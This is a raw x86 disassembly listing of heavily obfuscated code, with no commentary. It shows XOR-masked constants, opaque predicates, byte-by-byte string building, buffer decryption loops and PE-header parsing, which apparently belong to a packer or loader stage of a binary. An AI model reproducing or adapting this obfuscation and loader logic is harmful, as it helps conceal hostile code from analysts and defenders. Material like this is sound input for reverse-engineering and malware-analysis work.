  426867:	mov    ecx,DWORD PTR [ebp-0x8]
  42686a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426872:	mov    ecx,DWORD PTR [ebp-0xe0]
  426878:	xor    ecx,ebx
  42687a:	lea    eax,[ecx+eax*1+0x3272f5]
  426881:	movzx  ecx,BYTE PTR [ebp-0x2]
  426885:	xor    ecx,eax
  426887:	mov    BYTE PTR [ebp-0x2],cl
  42688a:	mov    al,BYTE PTR [ebp-0x2]
  42688d:	mov    ecx,DWORD PTR [ebp-0x1c]
  426890:	mov    edx,DWORD PTR [ebp-0x44]
  426893:	xor    ecx,ebx
  426895:	add    ecx,esi
  426897:	imul   ecx,edx
  42689a:	mov    edx,DWORD PTR [ebp-0x8]
  42689d:	mov    BYTE PTR [ecx+edx*1],al
  4268a0:	mov    eax,DWORD PTR [ebp-0x1c]
  4268a3:	mov    ecx,DWORD PTR [ebp-0x44]
  4268a6:	xor    eax,ebx
  4268a8:	add    eax,esi
  4268aa:	imul   eax,ecx
  4268ad:	mov    ecx,DWORD PTR [ebp-0x8]
  4268b0:	mov    al,BYTE PTR [eax+ecx*1]
  4268b3:	mov    BYTE PTR [ebp-0x2],al
  4268b6:	mov    eax,DWORD PTR [ebp-0x1c]
  4268b9:	mov    ecx,DWORD PTR [ebp-0x44]
  4268bc:	xor    eax,ebx
  4268be:	add    eax,esi
  4268c0:	imul   eax,ecx
  4268c3:	mov    ecx,DWORD PTR [ebp-0x34]
  4268c6:	xor    ecx,ebx
  4268c8:	add    eax,ecx
  4268ca:	mov    ecx,DWORD PTR [ebp-0x8]
  4268cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  4268d5:	mov    ecx,DWORD PTR [ebp-0xc4]
  4268db:	xor    ecx,ebx
  4268dd:	lea    eax,[ecx+eax*1+0x3272f5]
  4268e4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4268e8:	xor    ecx,eax
  4268ea:	mov    BYTE PTR [ebp-0x2],cl
  4268ed:	mov    al,BYTE PTR [ebp-0x2]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268f3:	mov    edx,DWORD PTR [ebp-0x44]
  4268f6:	xor    ecx,ebx
  4268f8:	add    ecx,esi
  4268fa:	imul   ecx,edx
  4268fd:	mov    edx,DWORD PTR [ebp-0x8]
  426900:	mov    BYTE PTR [ecx+edx*1],al
  426903:	mov    eax,DWORD PTR [ebp-0x30]
  426906:	mov    ecx,DWORD PTR [ebp-0x34]
  426909:	xor    eax,ebx
  42690b:	xor    ecx,ebx
  42690d:	add    eax,esi
  42690f:	add    ecx,esi
  426911:	imul   eax,ecx
  426914:	add    eax,DWORD PTR [ebp-0x44]
  426917:	mov    DWORD PTR [ebp-0x44],eax
  42691a:	mov    eax,DWORD PTR [ebp-0x44]
  42691d:	mov    ecx,DWORD PTR [ebp-0x14]
  426920:	cmp    ecx,eax
  426922:	jb     0x426826
  426928:	mov    eax,DWORD PTR [ebp-0x34]
  42692b:	mov    ecx,DWORD PTR [ebp-0x14]
  42692e:	xor    eax,ebx
  426930:	add    eax,esi
  426932:	imul   eax,ecx
  426935:	mov    ecx,DWORD PTR [ebp-0x20]
  426938:	xor    ecx,ebx
  42693a:	add    ecx,esi
  42693c:	or     eax,ecx
  42693e:	mov    ecx,DWORD PTR [ebp-0x2c]
  426941:	xor    ecx,ebx
  426943:	add    eax,ecx
  426945:	mov    ecx,DWORD PTR [ebp-0x2c]
  426948:	xor    ecx,ebx
  42694a:	add    eax,ecx
  42694c:	mov    ecx,DWORD PTR [ebp-0xc]
  42694f:	lea    eax,[eax+ecx*1+0x64e5ea]
  426956:	jmp    0x426967
  426958:	mov    eax,DWORD PTR [ebp-0x2c]
  42695b:	mov    ecx,DWORD PTR [ebp-0xc]
  42695e:	xor    eax,ebx
  426960:	lea    eax,[eax+ecx*1+0x3272f5]
  426967:	mov    DWORD PTR [ebp-0xc],eax
  42696a:	mov    eax,DWORD PTR [ebp-0x2c]
  42696d:	xor    eax,ebx
  42696f:	mov    ecx,0xffcd8d0b
  426974:	sub    ecx,eax
  426976:	add    ecx,DWORD PTR [ebp-0x28]
  426979:	mov    eax,DWORD PTR [ebp-0x2c]
  42697c:	mov    edx,DWORD PTR [ebp-0xc]
  42697f:	xor    eax,ebx
  426981:	add    eax,esi
  426983:	imul   eax,edx
  426986:	cmp    eax,ecx
  426988:	jbe    0x42679a
  42698e:	mov    eax,DWORD PTR [ebp-0x10]
  426991:	mov    ecx,DWORD PTR [ebp-0x40]
  426994:	mov    eax,DWORD PTR [ebp+0x8]
  426997:	mov    edx,DWORD PTR [ebp-0x54]
  42699a:	mov    eax,DWORD PTR [eax+0x1e0]
  4269a0:	xor    edx,ebx
  4269a2:	add    edx,esi
  4269a4:	push   edx
  4269a5:	mov    edx,DWORD PTR [ebp-0x3c]
  4269a8:	xor    edx,ebx
  4269aa:	add    edx,esi
  4269ac:	push   edx
  4269ad:	push   ecx
  4269ae:	mov    DWORD PTR [ebp-0x30],ecx
  4269b1:	mov    ecx,DWORD PTR [ebp-0x10]
  4269b4:	xor    ecx,ebx
  4269b6:	add    ecx,esi
  4269b8:	push   ecx
  4269b9:	call   DWORD PTR [eax+0x14]
  4269bc:	mov    edi,eax
  4269be:	mov    eax,DWORD PTR [ebp-0x10]
  4269c1:	xor    eax,ebx
  4269c3:	add    eax,esi
  4269c5:	cmp    eax,edi
  4269c7:	je     0x426a22
  4269c9:	mov    eax,DWORD PTR [ebp-0x10]
  4269cc:	jmp    0x4269ef
  4269ce:	mov    ecx,DWORD PTR [ebp-0x24]
  4269d1:	xor    eax,ebx
  4269d3:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f5]
  4269da:	mov    BYTE PTR [eax+edi*1+0x3272f5],cl
  4269e1:	mov    ecx,DWORD PTR [ebp-0x18]
  4269e4:	xor    ecx,ebx
  4269e6:	lea    eax,[ecx+eax*1+0x3272f5]
  4269ed:	xor    eax,ebx
  4269ef:	mov    ecx,DWORD PTR [ebp-0x40]
  4269f2:	sub    ecx,esi
  4269f4:	xor    ecx,ebx
  4269f6:	cmp    eax,ecx
  4269f8:	jne    0x4269ce
  4269fa:	mov    eax,DWORD PTR [ebp+0x8]
  4269fd:	mov    ecx,DWORD PTR [ebp-0x50]
  426a00:	mov    eax,DWORD PTR [eax+0x1e0]
  426a06:	xor    ecx,ebx
  426a08:	add    ecx,esi
  426a0a:	push   ecx
  426a0b:	mov    ecx,DWORD PTR [ebp-0x10]
  426a0e:	xor    ecx,ebx
  426a10:	add    ecx,esi
  426a12:	push   ecx
  426a13:	push   DWORD PTR [ebp-0x24]
  426a16:	call   DWORD PTR [eax+0x18]
  426a19:	mov    eax,DWORD PTR [ebp-0x30]
  426a1c:	mov    DWORD PTR [ebp-0x24],edi
  426a1f:	mov    DWORD PTR [ebp-0x40],eax
  426a22:	mov    edi,DWORD PTR [ebp-0x24]
  426a25:	mov    eax,DWORD PTR [ebp-0x18]
  426a28:	mov    ecx,DWORD PTR [ebp-0x10]
  426a2b:	xor    eax,ebx
  426a2d:	mov    DWORD PTR [ebp-0x30],edi
  426a30:	add    eax,esi
  426a32:	mov    DWORD PTR [ebp-0x5c],0x402b332b
  426a39:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  426a40:	jmp    0x426a74
  426a42:	xor    ecx,ebx
  426a44:	mov    dl,BYTE PTR [ebp+ecx*1+0x327299]
  426a4b:	xor    dl,0x7e
  426a4e:	add    dl,0x3
  426a51:	mov    DWORD PTR [ebp-0x3c],ecx
  426a54:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f5]
  426a5c:	movzx  edx,dl
  426a5f:	cmp    ecx,edx
  426a61:	jne    0x426a7e
  426a63:	mov    ecx,DWORD PTR [ebp-0x18]
  426a66:	mov    edx,DWORD PTR [ebp-0x3c]
  426a69:	xor    ecx,ebx
  426a6b:	lea    ecx,[ecx+edx*1+0x3272f5]
  426a72:	xor    ecx,ebx
  426a74:	cmp    ecx,0xf89c85bd
  426a7a:	jne    0x426a42
  426a7c:	jmp    0x426a85
  426a7e:	mov    eax,DWORD PTR [ebp-0x10]
  426a81:	xor    eax,ebx
  426a83:	add    eax,esi
  426a85:	mov    ecx,DWORD PTR [ebp-0x10]
  426a88:	xor    ecx,ebx
  426a8a:	add    ecx,esi
  426a8c:	cmp    ecx,eax
  426a8e:	je     0x426c01
  426a94:	mov    eax,DWORD PTR [edi+0x8]
  426a97:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426a9e:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426aa5:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  426aac:	mov    DWORD PTR [ebp-0x20],0xf89c85a1
  426ab3:	mov    DWORD PTR [ebp-0x14],eax
  426ab6:	mov    eax,DWORD PTR [ebp+0x8]
  426ab9:	mov    ecx,DWORD PTR [ebp-0x20]
  426abc:	xor    ecx,ebx
  426abe:	add    ecx,esi
  426ac0:	push   ecx
  426ac1:	mov    ecx,DWORD PTR [ebp-0x48]
  426ac4:	mov    eax,DWORD PTR [eax+0x1e0]
  426aca:	xor    ecx,ebx
  426acc:	add    ecx,esi
  426ace:	push   ecx
  426acf:	mov    ecx,DWORD PTR [ebp-0x3c]
  426ad2:	xor    ecx,ebx
  426ad4:	add    ecx,esi
  426ad6:	push   ecx
  426ad7:	mov    ecx,DWORD PTR [ebp-0xc]
  426ada:	xor    ecx,ebx
  426adc:	add    ecx,esi
  426ade:	push   ecx
  426adf:	call   DWORD PTR [eax+0x14]
  426ae2:	mov    edi,eax
  426ae4:	mov    eax,DWORD PTR [ebp+0x8]
  426ae7:	mov    ecx,DWORD PTR [ebp-0x20]
  426aea:	mov    eax,DWORD PTR [eax+0x1e0]
  426af0:	xor    ecx,ebx
  426af2:	add    ecx,esi
  426af4:	push   ecx
  426af5:	mov    ecx,DWORD PTR [ebp-0x48]
  426af8:	xor    ecx,ebx
  426afa:	add    ecx,esi
  426afc:	push   ecx
  426afd:	mov    ecx,DWORD PTR [ebp-0xc]
  426b00:	push   DWORD PTR [ebp-0x14]
  426b03:	xor    ecx,ebx
  426b05:	add    ecx,esi
  426b07:	push   ecx
  426b08:	call   DWORD PTR [eax+0x14]
  426b0b:	mov    ecx,DWORD PTR [ebp-0xc]
  426b0e:	xor    ecx,ebx
  426b10:	add    ecx,esi
  426b12:	mov    DWORD PTR [ebp-0x20],eax
  426b15:	cmp    ecx,edi
  426b17:	je     0x426ea4
  426b1d:	mov    ecx,DWORD PTR [ebp-0xc]
  426b20:	xor    ecx,ebx
  426b22:	add    ecx,esi
  426b24:	cmp    ecx,eax
  426b26:	je     0x426ea4
  426b2c:	mov    DWORD PTR [ebp-0x3c],0xf89c85a0
  426b33:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426b3a:	mov    ecx,DWORD PTR [ebp-0x3c]
  426b3d:	xor    cl,0xae
  426b40:	sub    cl,0xb
  426b43:	mov    BYTE PTR [edi],cl
  426b45:	mov    ecx,DWORD PTR [ebp-0xc]
  426b48:	xor    cl,0xae
  426b4b:	sub    cl,0xb
  426b4e:	mov    BYTE PTR [edi+0x1],cl
  426b51:	mov    ecx,DWORD PTR [ebp-0x54]
  426b54:	xor    cl,0xae
  426b57:	sub    cl,0xb
  426b5a:	mov    BYTE PTR [edi+0x2],cl
  426b5d:	and    DWORD PTR [ebp-0xc8],0x0
  426b64:	and    DWORD PTR [ebp-0xdc],0x0
  426b6b:	lea    ecx,[ebp-0xdc]
  426b71:	push   ecx
  426b72:	push   DWORD PTR [ebp-0x14]
  426b75:	push   eax
  426b76:	lea    eax,[ebp-0xc8]
  426b7c:	push   eax
  426b7d:	mov    eax,DWORD PTR [ebp-0x30]
  426b80:	push   DWORD PTR [eax+0xc]
  426b83:	mov    eax,DWORD PTR [ebp-0x24]
  426b86:	add    eax,0x10
  426b89:	push   eax
  426b8a:	push   edi
  426b8b:	call   0x425e31
  426b90:	mov    DWORD PTR [ebp-0x3c],eax
  426b93:	mov    eax,DWORD PTR [ebp+0x8]
  426b96:	mov    ecx,DWORD PTR [ebp-0x50]
  426b99:	mov    eax,DWORD PTR [eax+0x1e0]
  426b9f:	xor    ecx,ebx
  426ba1:	add    ecx,esi
  426ba3:	push   ecx
  426ba4:	mov    ecx,DWORD PTR [ebp-0xc]
  426ba7:	xor    ecx,ebx
  426ba9:	add    ecx,esi
  426bab:	push   ecx
  426bac:	push   edi
  426bad:	call   DWORD PTR [eax+0x18]
  426bb0:	mov    eax,DWORD PTR [ebp-0x3c]
  426bb3:	add    eax,0xffcd8d0b
  426bb8:	xor    eax,ebx
  426bba:	cmp    eax,0xf89c85a5
  426bbf:	mov    eax,DWORD PTR [ebp+0x8]
  426bc2:	mov    eax,DWORD PTR [eax+0x1e0]
  426bc8:	mov    ecx,DWORD PTR [ebp-0x50]
  426bcb:	jne    0x426bee
  426bcd:	xor    ecx,ebx
  426bcf:	add    ecx,esi
  426bd1:	push   ecx
  426bd2:	mov    ecx,DWORD PTR [ebp-0xc]
  426bd5:	xor    ecx,ebx
  426bd7:	add    ecx,esi
  426bd9:	push   ecx
  426bda:	push   DWORD PTR [ebp-0x24]
  426bdd:	call   DWORD PTR [eax+0x18]
  426be0:	mov    eax,DWORD PTR [ebp-0x20]
  426be3:	mov    DWORD PTR [ebp-0x24],eax
  426be6:	mov    eax,DWORD PTR [ebp-0x14]
  426be9:	mov    DWORD PTR [ebp-0x40],eax
  426bec:	jmp    0x426c01
  426bee:	xor    ecx,ebx
  426bf0:	add    ecx,esi
  426bf2:	push   ecx
  426bf3:	mov    ecx,DWORD PTR [ebp-0xc]
  426bf6:	xor    ecx,ebx
  426bf8:	add    ecx,esi
  426bfa:	push   ecx
  426bfb:	push   DWORD PTR [ebp-0x20]
  426bfe:	call   DWORD PTR [eax+0x18]
  426c01:	mov    eax,DWORD PTR [ebp-0x40]
  426c04:	mov    DWORD PTR [ebp-0x38],eax
  426c07:	mov    eax,DWORD PTR [ebp-0x24]
  426c0a:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426c11:	mov    DWORD PTR [ebp-0x3c],eax
  426c14:	mov    edi,0xf89c85a2
  426c19:	mov    DWORD PTR [ebp-0x2c],edi
  426c1c:	mov    eax,DWORD PTR [ebp-0x28]
  426c1f:	xor    eax,ebx
  426c21:	add    eax,esi
  426c23:	mov    DWORD PTR [ebp-0xc],eax
  426c26:	mov    eax,DWORD PTR [ebp-0x28]
  426c29:	xor    eax,ebx
  426c2b:	add    eax,esi
  426c2d:	mov    DWORD PTR [ebp-0x14],eax
  426c30:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  426c37:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  426c3e:	mov    eax,DWORD PTR [ebp-0x28]
  426c41:	mov    ecx,DWORD PTR [ebp-0x38]
  426c44:	xor    eax,ebx
  426c46:	add    eax,esi
  426c48:	cmp    ecx,eax
  426c4a:	je     0x426e40
  426c50:	jmp    0x426e1c
  426c55:	mov    ecx,DWORD PTR [ebp-0xc]
  426c58:	mov    eax,DWORD PTR [ebp-0x38]
  426c5b:	sub    eax,ecx
  426c5d:	mov    ecx,DWORD PTR [ebp-0x48]
  426c60:	xor    ecx,ebx
  426c62:	add    ecx,esi
  426c64:	xor    edx,edx
  426c66:	div    ecx
  426c68:	mov    DWORD PTR [ebp-0x14],eax
  426c6b:	mov    eax,DWORD PTR [ebp-0x20]
  426c6e:	mov    ecx,DWORD PTR [ebp-0x14]
  426c71:	xor    eax,ebx
  426c73:	add    eax,esi
  426c75:	cmp    ecx,eax
  426c77:	jbe    0x426c83
  426c79:	mov    eax,DWORD PTR [ebp-0x20]
  426c7c:	xor    eax,ebx
  426c7e:	add    eax,esi
  426c80:	mov    DWORD PTR [ebp-0x14],eax
  426c83:	mov    eax,DWORD PTR [ebp-0x48]
  426c86:	mov    ecx,DWORD PTR [ebp-0x14]
  426c89:	xor    eax,ebx
  426c8b:	add    eax,esi
  426c8d:	imul   eax,ecx
  426c90:	mov    DWORD PTR [ebp-0x14],eax
  426c93:	mov    eax,DWORD PTR [ebp-0x28]
  426c96:	mov    ecx,DWORD PTR [ebp-0x14]
  426c99:	xor    eax,ebx
  426c9b:	add    eax,esi
  426c9d:	cmp    ecx,eax
  426c9f:	je     0x426e0a
  426ca5:	mov    eax,DWORD PTR [ebp-0x14]
  426ca8:	mov    DWORD PTR [ebp-0x34],eax
  426cab:	mov    eax,DWORD PTR [ebp-0xc]
  426cae:	add    eax,DWORD PTR [ebp-0x3c]
  426cb1:	mov    DWORD PTR [ebp-0x4c],0xf89c85a5
  426cb8:	mov    DWORD PTR [ebp-0x14],edi
  426cbb:	mov    DWORD PTR [ebp-0x54],0xf89c85a3
  426cc2:	mov    DWORD PTR [ebp-0x1c],eax
  426cc5:	mov    DWORD PTR [ebp-0x30],0xf89c85a0
  426ccc:	mov    DWORD PTR [ebp-0x8],edi
  426ccf:	mov    eax,DWORD PTR [ebp-0x4c]
  426cd2:	xor    eax,ebx
  426cd4:	add    eax,esi
  426cd6:	jmp    0x426dc9
  426cdb:	mov    DWORD PTR [ebp-0xe4],0xf89c85b8
  426ce5:	mov    DWORD PTR [ebp-0xd0],0xf89c858f
  426cef:	mov    eax,DWORD PTR [ebp-0x8]
  426cf2:	mov    ecx,DWORD PTR [ebp-0x18]
  426cf5:	xor    eax,ebx
  426cf7:	add    eax,esi
  426cf9:	imul   eax,ecx
  426cfc:	mov    ecx,DWORD PTR [ebp-0x1c]
  426cff:	mov    al,BYTE PTR [eax+ecx*1]
  426d02:	mov    BYTE PTR [ebp-0x1],al
  426d05:	mov    eax,DWORD PTR [ebp-0x8]
  426d08:	mov    ecx,DWORD PTR [ebp-0x18]
  426d0b:	xor    eax,ebx
  426d0d:	add    eax,esi
  426d0f:	imul   eax,ecx
  426d12:	mov    ecx,DWORD PTR [ebp-0x54]
  426d15:	xor    ecx,ebx
  426d17:	add    eax,ecx
  426d19:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d1c:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d24:	mov    ecx,DWORD PTR [ebp-0xe4]
  426d2a:	xor    ecx,ebx
  426d2c:	lea    eax,[ecx+eax*1+0x3272f5]
  426d33:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d37:	xor    ecx,eax
  426d39:	mov    BYTE PTR [ebp-0x1],cl
  426d3c:	mov    al,BYTE PTR [ebp-0x1]
  426d3f:	mov    ecx,DWORD PTR [ebp-0x8]
  426d42:	mov    edx,DWORD PTR [ebp-0x18]
  426d45:	xor    ecx,ebx
  426d47:	add    ecx,esi
  426d49:	imul   ecx,edx
  426d4c:	mov    edx,DWORD PTR [ebp-0x1c]
  426d4f:	mov    BYTE PTR [ecx+edx*1],al
  426d52:	mov    eax,DWORD PTR [ebp-0x8]
  426d55:	mov    ecx,DWORD PTR [ebp-0x18]
  426d58:	xor    eax,ebx
  426d5a:	add    eax,esi
  426d5c:	imul   eax,ecx
  426d5f:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d62:	mov    al,BYTE PTR [eax+ecx*1]
  426d65:	mov    BYTE PTR [ebp-0x1],al
  426d68:	mov    eax,DWORD PTR [ebp-0x8]
  426d6b:	mov    ecx,DWORD PTR [ebp-0x18]
  426d6e:	xor    eax,ebx
  426d70:	add    eax,esi
  426d72:	imul   eax,ecx
  426d75:	mov    ecx,DWORD PTR [ebp-0x14]
  426d78:	xor    ecx,ebx
  426d7a:	add    eax,ecx
  426d7c:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d7f:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f5]
  426d87:	mov    ecx,DWORD PTR [ebp-0xd0]
  426d8d:	xor    ecx,ebx
  426d8f:	lea    eax,[ecx+eax*1+0x3272f5]
  426d96:	movzx  ecx,BYTE PTR [ebp-0x1]
  426d9a:	xor    ecx,eax
  426d9c:	mov    BYTE PTR [ebp-0x1],cl
  426d9f:	mov    al,BYTE PTR [ebp-0x1]
  426da2:	mov    ecx,DWORD PTR [ebp-0x8]
  426da5:	mov    edx,DWORD PTR [ebp-0x18]
  426da8:	xor    ecx,ebx
  426daa:	add    ecx,esi
  426dac:	imul   ecx,edx
  426daf:	mov    edx,DWORD PTR [ebp-0x1c]
  426db2:	mov    BYTE PTR [ecx+edx*1],al
  426db5:	mov    eax,DWORD PTR [ebp-0x30]
  426db8:	mov    ecx,DWORD PTR [ebp-0x14]
  426dbb:	xor    eax,ebx
  426dbd:	xor    ecx,ebx
  426dbf:	add    eax,esi
  426dc1:	add    ecx,esi
  426dc3:	imul   eax,ecx
  426dc6:	add    eax,DWORD PTR [ebp-0x18]
  426dc9:	mov    DWORD PTR [ebp-0x18],eax
  426dcc:	mov    eax,DWORD PTR [ebp-0x18]
  426dcf:	mov    ecx,DWORD PTR [ebp-0x34]
  426dd2:	cmp    ecx,eax
  426dd4:	jb     0x426cdb
  426dda:	mov    eax,DWORD PTR [ebp-0x14]
  426ddd:	mov    ecx,DWORD PTR [ebp-0x34]
  426de0:	xor    eax,ebx
  426de2:	add    eax,esi
  426de4:	imul   eax,ecx
  426de7:	mov    ecx,DWORD PTR [ebp-0x4c]
  426dea:	xor    ecx,ebx
  426dec:	add    ecx,esi
  426dee:	or     eax,ecx
  426df0:	mov    ecx,DWORD PTR [ebp-0x2c]
  426df3:	xor    ecx,ebx
  426df5:	add    eax,ecx
  426df7:	mov    ecx,DWORD PTR [ebp-0x2c]
  426dfa:	xor    ecx,ebx
  426dfc:	add    eax,ecx
  426dfe:	mov    ecx,DWORD PTR [ebp-0xc]
  426e01:	lea    eax,[eax+ecx*1+0x64e5ea]
  426e08:	jmp    0x426e19
  426e0a:	mov    eax,DWORD PTR [ebp-0x2c]
  426e0d:	mov    ecx,DWORD PTR [ebp-0xc]
  426e10:	xor    eax,ebx
  426e12:	lea    eax,[eax+ecx*1+0x3272f5]
  426e19:	mov    DWORD PTR [ebp-0xc],eax
  426e1c:	mov    eax,DWORD PTR [ebp-0x2c]
  426e1f:	xor    eax,ebx
  426e21:	mov    ecx,0xffcd8d0b
  426e26:	sub    ecx,eax
  426e28:	add    ecx,DWORD PTR [ebp-0x38]
  426e2b:	mov    eax,DWORD PTR [ebp-0x2c]
  426e2e:	mov    edx,DWORD PTR [ebp-0xc]
  426e31:	xor    eax,ebx
  426e33:	add    eax,esi
  426e35:	imul   eax,edx
  426e38:	cmp    eax,ecx
  426e3a:	jbe    0x426c55
  426e40:	push   DWORD PTR [ebp+0x8]
  426e43:	mov    eax,DWORD PTR [ebp+0x8]
  426e46:	push   DWORD PTR [eax+0x1cc]
  426e4c:	lea    eax,[ebp-0xd8]
  426e52:	push   eax
  426e53:	mov    eax,DWORD PTR [ebp+0x8]
  426e56:	mov    eax,DWORD PTR [eax+0x1c4]
  426e5c:	push   DWORD PTR [eax]
  426e5e:	mov    eax,DWORD PTR [ebp+0x8]
  426e61:	mov    eax,DWORD PTR [eax+0x1c0]
  426e67:	push   DWORD PTR [eax]
  426e69:	push   DWORD PTR [ebp-0x40]
  426e6c:	push   DWORD PTR [ebp-0x24]
  426e6f:	call   0x427906
  426e74:	mov    DWORD PTR [ebp-0x3c],eax
  426e77:	mov    eax,DWORD PTR [ebp-0x10]
  426e7a:	mov    ecx,DWORD PTR [ebp-0x24]
  426e7d:	xor    eax,ebx
  426e7f:	add    eax,esi
  426e81:	cmp    eax,ecx
  426e83:	je     0x426ea4
  426e85:	mov    eax,DWORD PTR [ebp+0x8]
  426e88:	mov    ecx,DWORD PTR [ebp-0x50]
  426e8b:	mov    eax,DWORD PTR [eax+0x1e0]
  426e91:	xor    ecx,ebx
  426e93:	add    ecx,esi
  426e95:	push   ecx
  426e96:	mov    ecx,DWORD PTR [ebp-0x10]
  426e99:	xor    ecx,ebx
  426e9b:	add    ecx,esi
  426e9d:	push   ecx
  426e9e:	push   DWORD PTR [ebp-0x24]
  426ea1:	call   DWORD PTR [eax+0x18]
  426ea4:	pop    edi
  426ea5:	pop    esi
  426ea6:	pop    ebx
  426ea7:	leave  
  426ea8:	ret    0x4
  426eab:	push   ebp
  426eac:	mov    ebp,esp
  426eae:	push   ecx
  426eaf:	push   ecx
  426eb0:	lea    eax,[ebp-0x8]
  426eb3:	mov    DWORD PTR [ebp-0x4],eax
  426eb6:	push   esi
  426eb7:	mov    esi,DWORD PTR [ebp-0x4]
  426eba:	mov    eax,0xf881ba2f
  426ebf:	mov    DWORD PTR [esi],eax
  426ec1:	mov    esi,DWORD PTR [ebp-0x8]
  426ec4:	cmp    esi,eax
  426ec6:	pop    esi
  426ec7:	jne    0x426ed1
  426ec9:	mov    BYTE PTR [ecx+0xa],0x83
  426ecd:	mov    BYTE PTR [edx+0x8],0x2e
  426ed1:	mov    BYTE PTR [edx+0xa],0x83
  426ed5:	mov    BYTE PTR [ecx+0x2],0x15
  426ed9:	leave  
  426eda:	ret    
  426edb:	push   ebp
  426edc:	mov    ebp,esp
  426ede:	push   ecx
  426edf:	push   ecx
  426ee0:	lea    eax,[ebp-0x8]
  426ee3:	mov    DWORD PTR [ebp-0x4],eax
  426ee6:	mov    edx,DWORD PTR [ebp-0x4]
  426ee9:	mov    eax,0xf88b0bcb
  426eee:	mov    DWORD PTR [edx],eax
  426ef0:	mov    edx,DWORD PTR [ebp-0x8]
  426ef3:	cmp    edx,eax
  426ef5:	jne    0x426f06
  426ef7:	mov    eax,DWORD PTR [ebp+0x8]
  426efa:	mov    BYTE PTR [ecx+0x9],0xf
  426efe:	mov    BYTE PTR [eax+0x7],0x56
  426f02:	mov    BYTE PTR [ecx+0x6],0xe
  426f06:	mov    BYTE PTR [ecx+0x3],0x1f
  426f0a:	leave  
  426f0b:	ret    0x4
  426f0e:	push   ebp
  426f0f:	mov    ebp,esp
  426f11:	push   ecx
  426f12:	push   ecx
  426f13:	lea    eax,[ebp-0x8]
  426f16:	mov    DWORD PTR [ebp-0x4],eax
  426f19:	mov    edx,DWORD PTR [ebp-0x4]
  426f1c:	mov    eax,0x7e0da2f
  426f21:	mov    DWORD PTR [edx],eax
  426f23:	mov    edx,DWORD PTR [ebp-0x8]
  426f26:	cmp    edx,eax
  426f28:	jne    0x426f2e
  426f2a:	mov    BYTE PTR [ecx+0x7],0x56
  426f2e:	mov    eax,DWORD PTR [ebp+0x8]
  426f31:	mov    BYTE PTR [ecx+0x1],0x18
  426f35:	mov    BYTE PTR [eax+0x9],0x2f
  426f39:	leave  
  426f3a:	ret    0x4
  426f3d:	push   ebp
  426f3e:	mov    ebp,esp
  426f40:	push   ecx
  426f41:	push   ecx
  426f42:	lea    eax,[ebp-0x8]
  426f45:	mov    DWORD PTR [ebp-0x4],eax
  426f48:	push   esi
  426f49:	mov    esi,DWORD PTR [ebp-0x4]
  426f4c:	mov    eax,0x7060e3c
  426f51:	mov    DWORD PTR [esi],eax
  426f53:	mov    esi,DWORD PTR [ebp-0x8]
  426f56:	cmp    esi,eax
  426f58:	pop    esi
  426f59:	jne    0x426f65
  426f5b:	mov    BYTE PTR [edx+0x4],0x12
  426f5f:	mov    WORD PTR [ecx+0x3],0x121f
  426f65:	mov    BYTE PTR [edx],0x3e
  426f68:	leave  
  426f69:	ret    
  426f6a:	push   ebp
  426f6b:	mov    ebp,esp
  426f6d:	push   ecx
  426f6e:	push   ecx
  426f6f:	lea    eax,[ebp-0x8]
  426f72:	mov    DWORD PTR [ebp-0x4],eax
  426f75:	mov    edx,DWORD PTR [ebp-0x4]
  426f78:	mov    eax,0xf8870b3f
  426f7d:	mov    DWORD PTR [edx],eax
  426f7f:	mov    edx,DWORD PTR [ebp-0x8]
  426f82:	cmp    edx,eax
  426f84:	jne    0x426f91
  426f86:	mov    eax,DWORD PTR [ebp+0x8]
  426f89:	mov    BYTE PTR [ecx+0x8],0xe
  426f8d:	mov    BYTE PTR [eax+0x1],0x18
  426f91:	mov    BYTE PTR [ecx+0x5],0xa
  426f95:	leave  
  426f96:	ret    0x4
  426f99:	push   esi
  426f9a:	mov    ecx,edi
  426f9c:	call   0x426f6a
  426fa1:	mov    edx,edi
  426fa3:	mov    ecx,esi
  426fa5:	mov    BYTE PTR [esi],0x1e
  426fa8:	call   0x426f3d
  426fad:	push   esi
  426fae:	mov    ecx,edi
  426fb0:	mov    BYTE PTR [esi+0x5],0xa
  426fb4:	call   0x426f0e
  426fb9:	push   esi
  426fba:	mov    BYTE PTR [esi+0x6],0xe
  426fbe:	call   0x426edb
  426fc3:	mov    BYTE PTR [esi+0x2],0x15
  426fc7:	mov    edx,esi
  426fc9:	jmp    0x426eab
  426fce:	push   ebp
  426fcf:	mov    ebp,esp
  426fd1:	push   ecx
  426fd2:	mov    ecx,DWORD PTR [edx+0x194]
  426fd8:	push   esi
  426fd9:	mov    esi,DWORD PTR [ebp+0x8]
  426fdc:	mov    esi,DWORD PTR [esi]
  426fde:	mov    DWORD PTR [ecx],esi
  426fe0:	mov    ecx,DWORD PTR [edx+0x194]
  426fe6:	mov    ecx,DWORD PTR [ecx]
  426fe8:	mov    esi,DWORD PTR [edx+0x190]
  426fee:	mov    DWORD PTR [esi],ecx
  426ff0:	mov    eax,DWORD PTR [edx+0x194]
  426ff6:	mov    ecx,DWORD PTR [eax]
  426ff8:	mov    ecx,DWORD PTR [ecx+0x3c]
  426ffb:	add    ecx,DWORD PTR [eax]
  426ffd:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  427004:	mov    eax,DWORD PTR [ebp-0x4]
  427007:	movzx  ecx,WORD PTR [ecx+0x16]
  42700b:	xor    eax,0x75108ae
  427010:	add    eax,0x3272f5
  427015:	pop    esi
  427016:	test   ecx,eax
  427018:	je     0x427026
